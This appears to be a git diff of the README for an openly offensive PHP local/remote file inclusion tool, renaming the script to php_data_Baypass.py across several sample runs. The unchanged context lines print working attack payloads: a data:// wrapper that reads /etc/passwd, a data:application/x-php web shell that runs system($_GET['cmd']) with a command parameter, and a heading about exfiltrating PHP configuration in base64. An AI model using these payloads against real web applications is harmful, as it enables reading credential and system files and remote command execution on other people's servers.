@@ -16,7 +16,7 @@ cd LFI-RFI
 ## To start the tool, simply run:
 
 ```
-python php-exfiltrate.py
+python php_data_Baypass.py
 ```
 # This will present an interactive menu-driven interface to configure payload options.
 
@@ -49,7 +49,7 @@ Here are some sample runs showing practical usage:
 # LFI Payload with /etc/passwd
 
 ```
-python php-exfiltrate.py
+python php_data_Baypass.py
 
 Select model > 2. data://
 Choose data type > 1. text/plain
@@ -62,7 +62,7 @@ data://text/plain,<?php echo file_get_contents('/etc/passwd');?>
 ```
 # Get OS Shell with System Execution:
 ```
-python php-exfiltrate.py
+python php_data_Baypass.py
 
 Select model > 1. data:
 Choose data type > 2. application/x-php
@@ -75,7 +75,7 @@ data:application/x-php,<?php system($_GET['cmd']);?>&cmd=ls -la
 ```
 # Exfiltrate PHP Config in Base64 Format
 ```
-python php-exfiltrate.py
+python php_data_Baypass.py
 
 Select model > 2. data://  
 Choose data type > 1. text/plain
